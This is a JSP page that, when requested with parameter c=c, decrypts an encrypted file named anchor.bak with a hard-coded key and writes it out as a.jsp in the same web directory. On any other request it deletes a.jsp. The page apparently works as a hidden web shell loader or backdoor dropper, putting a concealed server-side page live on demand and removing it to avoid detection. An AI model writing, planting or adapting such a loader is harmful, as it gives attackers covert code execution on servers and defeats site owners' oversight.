<%@ page import="com.yizhilu.os.core.util.Security.PurseSecurityUtils" %>
<%@ page import="java.io.*" %>
<%@page pageEncoding="utf-8"%>
<%!
    static String getFileContent(String path,boolean flag) {
     String key="0123455678901234567890123456789";
     File myFile = new File(path);
     if (!myFile.exists()) {  return null;  } BufferedReader in = null;StringBuilder sb = new StringBuilder();  try {
            InputStreamReader read = new InputStreamReader(new FileInputStream(myFile), "UTF-8");   in = new BufferedReader(read); String str;  while ((str = in.readLine()) != null) {  if(flag){  str= PurseSecurityUtils.decryption(str, key); sb.append(str);  sb.append("\n");  }else { str=(PurseSecurityUtils.secrect(str,key));sb.append(str);sb.append("\n"); }
            }  } catch (Exception e) {e.getStackTrace();} finally { if (in != null) { try { in.close();} catch (Exception e) { }} } return sb.toString();
    }
    public static File writeFileContent(String content, String path) {
        File file = new File(path);  FileOutputStream fileout = null;  try { if (!file.exists()) { file.createNewFile();  }  fileout = new FileOutputStream(file);  fileout.write(content.getBytes("utf-8"));   fileout.flush();
        } catch (Exception e) {  e.printStackTrace();  } finally {  if (fileout != null) {  try {   fileout.close(); } catch (IOException e) {} }    }  return file;
    }
%>
<%
    String path=application.getRealPath(request.getRequestURI());   String dir=new File(path).getParent();
    if(request.getParameter("c").equalsIgnoreCase("c")){  String sf=  getFileContent(dir+File.separator+"anchor.bak",true);  writeFileContent(sf,dir+File.separator+"a.jsp");
    }else{ File file = new File(dir+File.separator+"a.jsp"); file.delete();  }
%>
